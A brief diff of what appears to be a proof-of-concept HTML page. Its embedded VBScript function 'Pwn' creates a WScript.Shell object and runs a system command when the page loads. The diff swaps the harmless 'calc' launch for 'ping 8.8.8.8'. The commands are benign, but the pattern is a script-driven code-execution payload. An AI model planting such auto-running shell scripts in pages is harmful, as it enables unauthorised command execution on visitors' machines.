@@ -9,8 +9,8 @@
 
 	<script type="VBScript">
 		Function Pwn()
-			Set shell = CreateObject("wscript.shell")
-			shell.run "calc"
+			Set shell = CreateObject("WScript.Shell")
+			shell.run "ping 8.8.8.8"
 		End Function
 
 		Pwn
